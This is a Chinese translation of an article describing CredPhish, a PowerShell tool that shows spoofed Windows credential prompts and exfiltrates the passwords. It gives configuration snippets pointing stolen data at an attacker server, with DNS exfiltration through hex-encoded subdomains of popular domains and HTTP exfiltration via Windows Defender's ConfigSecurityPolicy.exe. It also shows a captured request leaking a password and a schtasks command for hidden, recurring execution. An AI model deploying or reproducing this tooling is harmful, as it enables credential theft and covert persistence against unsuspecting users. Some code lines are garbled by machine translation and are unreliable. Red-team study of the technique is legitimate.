> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/dCuCekqcec9wqPvJJY0HdA)

![](https://mmbiz.qpic.cn/mmbiz_png/aPmkR80bcV0K6kJ9CJbxH761PtpXaiaibIUOoMwfDxjqSsUenx8Z3SWx8iaerZJicHtZHPQQJMMo5T4w2LY7Jl7B5Q/640?wx_fmt=png)

        欺骗凭证提示是一种有效的权限提升和横向移动技术。在 Windows 环境中遇到 Outlook、VPN 和各种其他身份验证协议看似随机的密码提示并不罕见。攻击者将滥用 Windows 和 PowerShell 中内置的功能来调用凭据弹出窗口来获取用户密码。   

根据 MITRE ATT&CK 框架的定义 ： 

        “当执行需要额外权限的程序时…… 操作系统通常会提示用户提供正确的凭据以授权任务的提升权限。攻击者可能会模仿常见的操作系统组件，通过看似合法的提示来提示用户输入凭据…… 通过 PowerShell 等语言。” 

### **什么是 CredPhish？** 

        CredPhish 是一个 PowerShell 脚本，旨在调用凭据提示和泄露密码。它依靠 CredentialPicker  API 来收集用户密码，依靠 PowerShell 的 Resolve-DnsName 进行 DNS 渗漏，并依靠 Windows Defender 的 ConfigSecurityPolicy.exe 来执行任意 GET 请求。 

        下面是 CredPhish 的一个例子。请注意凭据在 Windows 安全提示中提交后立即传送到攻击者的 DNS 服务器。 

![](https://mmbiz.qpic.cn/mmbiz_gif/aPmkR80bcV0K6kJ9CJbxH761PtpXaiaibIYZpxzicvXw1RdaXxmLyibMSQwVL2ENOra5KQv0GeibtwfXTwibIsoRRfYg/640?wx_fmt=gif)

        默认情况下，CredPhish 将使用 Resolve-DnsName（PowerShell 内置的 DNS 解析器）来窃取凭据。它将凭据中的每个字符转换为其各自的十六进制值，将转换后的值分解为预定义的块，并将这些块放入流行网站的子域中。以下屏幕截图是十六进制形式的泄露凭据示例。请注意 google.com 和 office.com 子域中 “tokyoneon”(746f6b796f6e656f6e) 的十六进制值。 

![](https://mmbiz.qpic.cn/mmbiz_png/aPmkR80bcV0K6kJ9CJbxH761PtpXaiaibInQqGiapo7bdoMiaGyicb1taTLCNFGmKAsIxF60ewAEudEjPENG012Q7aw/640?wx_fmt=png)

        在解析 DNS 查询之前，DNS 服务器将剥离十六进制子域以避免创建数十个错误响应。在下面的 Wireshark 屏幕截图中，请注意 “Answers” 字段不再包含子域并成功解析为 Google 的 IP 地址之一。 

![](https://mmbiz.qpic.cn/mmbiz_png/aPmkR80bcV0K6kJ9CJbxH761PtpXaiaibIHUvqicicfLjAhSPfPr77U1EVLHFDHBEhhQibjbTfXXYcouMicicKZ7wVOlg/640?wx_fmt=png)

### **CredPhish.ps1 配置** 

        我将 credphish.ps1 设计  为一个独立的脚本，不需要 `Import-Module`，这是一个常见的妥协指标。可配置选项以变量的形式位于 PS1 脚本的顶部，以避免冗长的命令行参数。 

        第一行是最重要的，因为它定义了泄露数据的交付位置（即攻击者的 Kali 服务器）。 

```
# exfil 地址  
$exfilServer  =  "192.168.56.112" 
```

        接下来，几个变量定义了提示将如何呈现给毫无戒心的目标用户。在 `$promptCaption` 定义了 “_应用程序_” 请求用户证书（例如，“微软办公室”）。并且 `$promptMessage` 通常指定与请求关联的帐户。 

```
# prompt 
$targetUser  =  $ env : username 
$companyEmail  =  " blackhillsinfosec.com "
 $promptCaption  =  " Microsoft Office "
 $promptMessage  =  " Connecting to: $targetUser @ $companyEmail "
 $maxTries  =  1  # 调用提示的最大次数
$ delayPrompts  =  2  # 提示之间的秒数
$validateCredentials  =  $ false  # 如果凭据有效，则中断 $maxTries 并立即删除
```

        该 `$maxTries` 变量定义了在目标提交凭据之前提示出现的次数。为避免怀疑， `1` 是默认值。该 `$delayPrompts` 变量定义了每个提示之间的秒数（如果 `$maxTries` 大于 `1`）。并且 `$validateCredentials`，默认情况下禁用，将尝试`Start-Process` 在提升的上下文中使用本地验证提交的凭据 。如果启用并验证凭据， `$maxTries` 则会被忽略，并且数据会立即发送到攻击者的服务器。 

### **过滤方法** 

        如前所述，DNS 外泄是将密码传送到攻击者服务器的默认方法。                        `$exfilDomains` 列表包括用于 DNS 查询并随机选择的各种域。该                            `$subdomainLength` 变量决定了每个子域的所需长度。 

```
#域名解析
# 在kali中启动dns服务器：python3 /path/to/credphish/dns_server.py
$ enableDnsExfil  =  $真
$ exfilDomains  = @（' .microsoft.com '， ' .google.com '， ' .office.com '， ' .live.com '）的DNS exfil＃域
$ randomDelay  =  GET随机 -最小5  -最大20  # dns 查询之间的延迟
$subdomainLength  =  6  # 子域中的最大字符数。必须是 2-60 之间的偶数，否则查询会中断
```

        要拦截使用 DNS 过滤功能发送的凭据，请 在 Kali 中执行 dns_server.py 脚本。按 `Ctrl` + `c` 终止 DNS 服务器，它将以明文形式重建拦截的凭据。 

![](https://mmbiz.qpic.cn/mmbiz_gif/aPmkR80bcV0K6kJ9CJbxH761PtpXaiaibIYZpxzicvXw1RdaXxmLyibMSQwVL2ENOra5KQv0GeibtwfXTwibIsoRRfYg/640?wx_fmt=gif)

         CredPhish 中内置的另一种渗漏方法是 HTTP 请求方法。它利用 Windows Defender 中包含的二进制文件 “ ConfigSecurityPolicy.exe ” 向攻击者的服务器提供凭据。将 `$enableHttpExfil` 变量设置 `$true` 为启用它。 

```
# http 
# 在 kali 中启动 http 服务器：python3 -m http.server 80
 $enableHttpExfil  =  $false 
$ConfigSecurityPolicy  =  " C:\Prog*Files\Win*Defender\ConfigSecurityPolicy.exe "
```

        要拦截使用 发送的凭据 `ConfigSecurityPolicy.exe`，请在 Kali 中启动一个简单的 HTTP 服务器以在日志中捕获它们。 

![](https://mmbiz.qpic.cn/mmbiz_gif/aPmkR80bcV0K6kJ9CJbxH761PtpXaiaibIzMHMibQ6JW8Ae1IXoLX3WFnDBEO5R04HVrcFdR6SQnz93q7DWHcmbLQ/640?wx_fmt=gif)

在网络上，泄露的凭据将显示如下：

```
GET /DESKTOP-S4DAAF0%5Btokyoneon%3A%23!Extr3m3Ly_%26ecuRe-P%40ssw%25rD%23%5D HTTP/1.1  
Accept: */*  
UA-CPU: AMD64  
Accept-Encoding: gzip, deflate  
User-Agent: Mozilla /4.0（兼容；MSIE 7.0；Windows NT 10.0；Win64；x64；Trident/7.0；.NET4.0C；.NET4.0E） 
主机：192.168.56.104 
连接：Keep-Alive 
 
```

        由于凭证在传输前经过 URL 编码，因此使用 Burp 的解码器模块观察数据或使用 Python 的 `urllib` 库通过命令行进行 URL 解码。 

![](https://mmbiz.qpic.cn/mmbiz_png/aPmkR80bcV0K6kJ9CJbxH761PtpXaiaibIVU0iaEuibMl0KkQvicbHQS0icia5Xz8ibvsq3GG1UyUbl4mCRye2y8jmiamPw/640?wx_fmt=png)

```
>>>  from  urllib.parse  import unquote  
>>>  unquote ("/DESKTOP-S4DAAF0%5Btokyoneon%3A%23!Extr3m3Ly_%26ecuRe-P%40ssw%25rD%23%5D")  '/DESKTOP-S4DAAF0[tokyoneon:# !Extr3m3Ly_& ecuRe-P@ssw %rD#]' 
 
```

### **CredPhish.ps1 执行** 

        要快速测试 CredPhish，请将 移动 `credphish.ps1` 到目标 Windows 10 计算机并使用 PowerShell 执行它。 

![](https://mmbiz.qpic.cn/mmbiz_png/aPmkR80bcV0K6kJ9CJbxH761PtpXaiaibIyZ2ge96AcW8eN8BDKXqg9vFLpXh6g8XzZLNHQ1wsQoE1aVDDgZBzSg/640?wx_fmt=png)

        一种持久的执行方法可能涉及 Task Schedtokyoneon //uler，它是 Windows 的一个组件，它提供了以预定义的时间间隔安排脚本执行的能力。下面的 `schtasks` 示例将`credphish.ps1` 每 2 分钟执行 一次。 

```
schtasks /create /sc minute /mo 2 /tn "credphish" /tr "powershell -ep bypass -WindowStyle Hidden C:\path\to\credPhish\credphish.ps1" 
```